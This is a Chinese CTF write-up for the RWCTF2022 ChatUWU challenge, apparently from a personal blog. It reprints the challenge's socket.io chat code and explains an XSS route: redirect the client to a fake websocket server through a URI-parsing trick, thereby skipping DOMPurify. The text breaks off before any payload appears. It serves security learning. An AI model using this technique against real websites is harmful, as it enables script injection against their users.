@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="RWCTF2022&amp;CHATUWU" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            RWCTF2022&amp;CHATUWU
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="post-toc-text">0x01 代码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E5%88%A9%E7%94%A8parse%E8%A7%A3%E6%9E%90%E7%9A%84%E9%97%AE%E9%A2%98"><span class="post-toc-text">0x02 利用parse解析的问题</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="post-toc-text">0x03 构造恶意服务器</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0xFF"><span class="post-toc-text">0xFF</span></a></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>这道题说难不难，说简单也不简单，反正我没做出来 XD</p>
+<p>比赛的时候我看到有个DOMPurify，以为是找这个漏洞，然后bypass，其实不是的</p>
+<p>总结下来这个题目就两个点</p>
+<ul>
+<li>socket.io的uri解析trick导致跳转</li>
+<li>使用恶意websocket服务器，绕过DOMPurify</li>
+</ul>
+<h2 id="0x01-代码分析"><a href="#0x01-代码分析" class="headerlink" title="0x01 代码分析"></a>0x01 代码分析</h2><p>首先看源码</p>
+<p>客户端：</p>
+<p><code>index.html</code>，这里只展示相关代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;messages&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;input&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;140&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/socket.io/socket.io.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">reset</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        location.<span class="property">href</span> = <span class="string">`?nickname=guest<span class="subst">$&#123;<span class="built_in">String</span>(<span class="built_in">Math</span>.random()).substr(-<span class="number">4</span>)&#125;</span>&amp;room=textContent`</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> query = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>),</span></span><br><span class="line"><span class="language-javascript">        nickname = query.<span class="title function_">get</span>(<span class="string">&#x27;nickname&#x27;</span>),</span></span><br><span class="line"><span class="language-javascript">        room = query.<span class="title function_">get</span>(<span class="string">&#x27;room&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (!nickname || !room) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> k <span class="keyword">of</span> query.<span class="title function_">keys</span>()) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (![<span class="string">&#x27;nickname&#x27;</span>, <span class="string">&#x27;room&#x27;</span>].<span class="title function_">includes</span>(k)) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">title</span> += <span class="string">&#x27; - &#x27;</span> + room;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> socket = <span class="title function_">io</span>(<span class="string">`/<span class="subst">$&#123;location.search&#125;</span>`</span>),</span></span><br><span class="line"><span class="language-javascript">        messages = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;messages&#x27;</span>),</span></span><br><span class="line"><span class="language-javascript">        form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;form&#x27;</span>),</span></span><br><span class="line"><span class="language-javascript">        input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;input&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (input.<span class="property">value</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            socket.<span class="title function_">emit</span>(<span class="string">&#x27;msg&#x27;</span>, &#123;<span class="attr">from</span>: nickname, <span class="attr">text</span>: input.<span class="property">value</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">            input.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    socket.<span class="title function_">on</span>(<span class="string">&#x27;msg&#x27;</span>, <span class="keyword">function</span> (<span class="params">msg</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> item = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>),</span></span><br><span class="line"><span class="language-javascript">            msgtext = <span class="string">`[<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toLocaleTimeString()&#125;</span>] <span class="subst">$&#123;msg.<span class="keyword">from</span>&#125;</span>: <span class="subst">$&#123;msg.text&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">        room === <span class="string">&#x27;DOMPurify&#x27;</span> &amp;&amp; msg.<span class="property">isHtml</span> ? item.<span class="property">innerHTML</span> = msgtext : item.<span class="property">textContent</span> = msgtext;</span></span><br><span class="line"><span class="language-javascript">        messages.<span class="title function_">appendChild</span>(item);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    socket.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="params">msg</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(msg);</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>服务端：</p>
+<p><code>index.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)();</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>).<span class="title class_">Server</span>(app);</span><br><span class="line"><span class="keyword">const</span> io = <span class="built_in">require</span>(<span class="string">&#x27;socket.io&#x27;</span>)(http);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">DOMPurify</span> = <span class="built_in">require</span>(<span class="string">&#x27;isomorphic-dompurify&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> hostname = process.<span class="property">env</span>.<span class="property">HOSTNAME</span> || <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> rooms = [<span class="string">&#x27;textContent&#x27;</span>, <span class="string">&#x27;DOMPurify&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123;nickname, room&#125; = socket.<span class="property">handshake</span>.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!rooms.<span class="title function_">includes</span>(room)) &#123;</span><br><span class="line">        socket.<span class="title function_">emit</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;the room does not exist&#x27;</span>);</span><br><span class="line">        socket.<span class="title function_">disconnect</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    socket.<span class="title function_">join</span>(room);</span><br><span class="line">    io.<span class="title function_">to</span>(room).<span class="title function_">emit</span>(<span class="string">&#x27;msg&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">from</span>: <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="comment">// text: `$&#123;nickname&#125; has joined the room`</span></span><br><span class="line">        <span class="attr">text</span>: <span class="string">&#x27;a new user has joined the room&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&#x27;msg&#x27;</span>, <span class="function"><span class="params">msg</span> =&gt;</span> &#123;</span><br><span class="line">        msg.<span class="property">from</span> = <span class="title class_">String</span>(msg.<span class="property">from</span>).<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">16</span>)</span><br><span class="line">        msg.<span class="property">text</span> = <span class="title class_">String</span>(msg.<span class="property">text</span>).<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">140</span>)</span><br><span class="line">        <span class="keyword">if</span> (room === <span class="string">&#x27;DOMPurify&#x27;</span>) &#123;</span><br><span class="line">            io.<span class="title function_">to</span>(room).<span class="title function_">emit</span>(<span class="string">&#x27;msg&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">from</span>: <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(msg.<span class="property">from</span>),</span><br><span class="line">                <span class="attr">text</span>: <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(msg.<span class="property">text</span>),</span><br><span class="line">                <span class="attr">isHtml</span>: <span class="literal">true</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            io.<span class="title function_">to</span>(room).<span class="title function_">emit</span>(<span class="string">&#x27;msg&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">from</span>: msg.<span class="property">from</span>,</span><br><span class="line">                <span class="attr">text</span>: msg.<span class="property">text</span>,</span><br><span class="line">                <span class="attr">isHtml</span>: <span class="literal">false</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">listen</span>(port, hostname, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`ChatUWU server running at http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>首先解释一下这些代码的意思</p>
+<p>这是一个用socket.io库搭起来的即时聊天室，基于websocket协议。</p>
+<p>websocket是一种全面双工通讯的网络技术，任意一方都可以建立连接将数据推向另一方，websocket只需要建立一次连接，就可以一直保持通话。</p>
+<p>客户端里的<code>index.html</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> socket = <span class="title function_">io</span>(<span class="string">`/<span class="subst">$&#123;location.search&#125;</span>`</span>),</span><br><span class="line">    messages = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;messages&#x27;</span>),</span><br><span class="line">    form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;form&#x27;</span>),</span><br><span class="line">    input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里是建立一个websocket连接</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">form.<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    <span class="keyword">if</span> (input.<span class="property">value</span>) &#123;</span><br><span class="line">        socket.<span class="title function_">emit</span>(<span class="string">&#x27;msg&#x27;</span>, &#123;<span class="attr">from</span>: nickname, <span class="attr">text</span>: input.<span class="property">value</span>&#125;);</span><br><span class="line">        input.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里是向websocket服务端提交数据，数据的格式就是{“from”:”adasd”,”text”:”123”}<br>是通过socket.emit来提交，并将事件名称命名为msg</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">socket.<span class="title function_">on</span>(<span class="string">&#x27;msg&#x27;</span>, <span class="keyword">function</span> (<span class="params">msg</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> item = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>),</span><br><span class="line">            msgtext = <span class="string">`[<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toLocaleTimeString()&#125;</span>] <span class="subst">$&#123;msg.<span class="keyword">from</span>&#125;</span>: <span class="subst">$&#123;msg.text&#125;</span>`</span>;</span><br><span class="line">        room === <span class="string">&#x27;DOMPurify&#x27;</span> &amp;&amp; msg.<span class="property">isHtml</span> ? item.<span class="property">innerHTML</span> = msgtext : item.<span class="property">textContent</span> = msgtext;</span><br><span class="line">        messages.<span class="title function_">appendChild</span>(item);</span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里就是关键了，socket.on就是监听msg事件，并将获得的数据进行处理</p>
+<p>这里处理的方式就是新建一个对象，并判断得到的数据里的room的值是否为DOMPurify，如果是，那么就以HTML元素来插入值</p>
+<p>就是这个地方进行HTML注入，从而进行XSS</p>
+<p>接下来看服务端的<code>index.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123;nickname, room&#125; = socket.<span class="property">handshake</span>.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!rooms.<span class="title function_">includes</span>(room)) &#123;</span><br><span class="line">        socket.<span class="title function_">emit</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;the room does not exist&#x27;</span>);</span><br><span class="line">        socket.<span class="title function_">disconnect</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就是通过判断参数里是否有对应的值来决定是否建立连接</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">socket.<span class="title function_">on</span>(<span class="string">&#x27;msg&#x27;</span>, <span class="function"><span class="params">msg</span> =&gt;</span> &#123;</span><br><span class="line">    msg.<span class="property">from</span> = <span class="title class_">String</span>(msg.<span class="property">from</span>).<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">16</span>)</span><br><span class="line">    msg.<span class="property">text</span> = <span class="title class_">String</span>(msg.<span class="property">text</span>).<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">140</span>)</span><br><span class="line">    <span class="keyword">if</span> (room === <span class="string">&#x27;DOMPurify&#x27;</span>) &#123;</span><br><span class="line">        io.<span class="title function_">to</span>(room).<span class="title function_">emit</span>(<span class="string">&#x27;msg&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">from</span>: <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(msg.<span class="property">from</span>),</span><br><span class="line">            <span class="attr">text</span>: <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(msg.<span class="property">text</span>),</span><br><span class="line">            <span class="attr">isHtml</span>: <span class="literal">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        io.<span class="title function_">to</span>(room).<span class="title function_">emit</span>(<span class="string">&#x27;msg&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">from</span>: msg.<span class="property">from</span>,</span><br><span class="line">            <span class="attr">text</span>: msg.<span class="property">text</span>,</span><br><span class="line">            <span class="attr">isHtml</span>: <span class="literal">false</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里的就是关键了，监听msg事件，并判断将其接受到的值，如果room的值为DOMPurify，就对from参数和text参数调用DOMPurify.sanitize，来清理HTML代码，然后再返回给客户端</p>
+<p>那么该如何绕过呢，可以做一个假的服务端，让他连接，因为从客户端那里可以知道，他没有明确指定连接谁</p>
+<p>但是又如何让他连我的假服务端呢</p>
+<h2 id="0x02-利用parse解析的问题"><a href="#0x02-利用parse解析的问题" class="headerlink" title="0x02 利用parse解析的问题"></a>0x02 利用parse解析的问题</h2><p>这里就是看客户端的</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> socket = <span class="title function_">io</span>(<span class="string">`/<span class="subst">$&#123;location.search&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>
+
+<p>location.search就是当前网页的url里’&#x2F;‘后面的内容</p>
